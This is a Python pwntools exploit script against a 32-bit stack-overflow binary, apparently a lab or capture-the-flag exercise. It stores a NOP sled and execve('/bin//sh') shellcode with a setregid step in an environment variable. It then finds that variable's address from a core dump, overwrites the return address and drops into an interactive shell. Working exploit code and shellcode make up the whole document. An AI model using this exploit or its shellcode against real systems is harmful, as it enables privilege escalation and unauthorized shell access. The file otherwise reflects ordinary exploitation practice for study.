#!/usr/bin/env python

from pwn import *
import os
#ARG = ''

ENV ={'SHELLCODE':'\x90' * 500 + 'j2X\xcd\x80PP[YjGX\xcd\x80j\x0bX\x99RYRhn/shh//biT[\xcd\x80'}

p = process("./stack-ovfl-use-envp-32", env=ENV )
buf = 'A' * 30
if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()
c = Core('./core')

addr = c.stack.find('SHELLCODE')

print(hex(addr))

p = process("./stack-ovfl-use-envp-32", env=ENV)

buf = "AAAAAAAAAAAAAAAA" + p32(addr+10)

p.sendline(buf)

p.interactive()
